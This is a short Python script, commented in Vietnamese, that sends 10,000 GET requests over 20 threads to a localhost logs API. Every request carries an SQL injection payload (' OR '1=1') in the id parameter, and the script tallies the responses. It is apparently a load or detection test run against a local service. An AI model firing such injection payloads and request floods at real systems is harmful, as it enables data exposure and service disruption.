import requests
import threading
from queue import Queue

URL = "http://127.0.0.1/api/logs/traffic?id=1%20'%20OR%20'1=1'"
NUM_REQUESTS = 10000
NUM_THREADS = 20  # số luồng song song, có thể chỉnh

def worker(q: Queue, results: dict):
    while True:
        try:
            i = q.get_nowait()
        except:
            break
        try:
            resp = requests.get(URL, timeout=5)
            results["success"] += int(resp.status_code == 200)
            results["failed"] += int(resp.status_code != 200)
            print(f"[{i+1}/{NUM_REQUESTS}] Status: {resp.status_code}")
        except requests.RequestException as e:
            results["failed"] += 1
            print(f"[{i+1}/{NUM_REQUESTS}] Request failed: {e}")
        finally:
            q.task_done()

def send_requests_multithreaded():
    q = Queue()
    results = {"success": 0, "failed": 0}

    for i in range(NUM_REQUESTS):
        q.put(i)

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(q, results), daemon=True)
        t.start()
        threads.append(t)

    q.join()  # đợi tất cả task xong

    print(f"Done. Success: {results['success']}, Failed: {results['failed']}")

if __name__ == "__main__":
    send_requests_multithreaded()
